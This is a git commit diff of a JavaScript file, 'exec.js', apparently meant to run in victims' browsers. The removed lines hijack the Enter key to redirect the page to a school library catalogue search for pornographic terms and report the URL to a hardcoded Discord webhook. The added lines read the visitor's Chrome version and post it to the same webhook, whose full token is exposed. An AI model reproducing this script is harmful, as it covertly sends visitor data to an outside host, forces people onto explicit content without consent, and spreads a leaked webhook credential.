0443c87db8c1dca9850b4f7ee2976a3949bcc96f
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-05-22 13:18:55 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,12 +1,6 @@
-var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'it started with the new link'});xhr.send(data);
+function getChromeVersion () {     
+    var raw = navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./);
 
-(function() { 
-    document.addEventListener('keydown', function(event) {
-        if (event.key === 'Enter') {
-            window.location.href = 'https://search.follettsoftware.com/metasearch/ui/134341/search/all?q=gay%20furry%20porn&ists=0&activeMenu=HOME';
-            var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": window.location.href});xhr.send(data);
-        }
-    });
-})();
-
-console.log('j')
+    return raw ? parseInt(raw[2], 10) : false;
+}
+var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": getChromeVersion()});xhr.send(data);
